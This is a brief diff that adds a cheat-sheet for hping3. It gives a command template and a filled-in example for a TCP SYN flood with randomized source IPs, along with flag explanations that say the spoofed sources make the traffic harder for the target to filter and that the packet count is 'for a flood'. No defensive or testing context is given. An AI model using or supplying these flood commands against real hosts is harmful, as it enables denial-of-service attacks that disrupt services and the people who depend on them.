@@ -1,0 +1,12 @@
+hping3
+
+● hping3 -S <target-ip-or-domain> -p <port-number> --rand-source --win <window-size> -c <number-of-packets>
+
+{
+-S - Specifies to send SYN packets.
+--rand-source: Enables random source IPs, making it harder for the target to filter traffic.
+--win <window-size>: Sets the TCP window size (e.g., 64 or 128).
+-c <number-of-packets>: Specifies the number of packets to send (e.g., 1000 for a flood).
+}
+
+● hping3 -S 192.168.1.5 -p 80 --rand-source --win 64 -c 1000
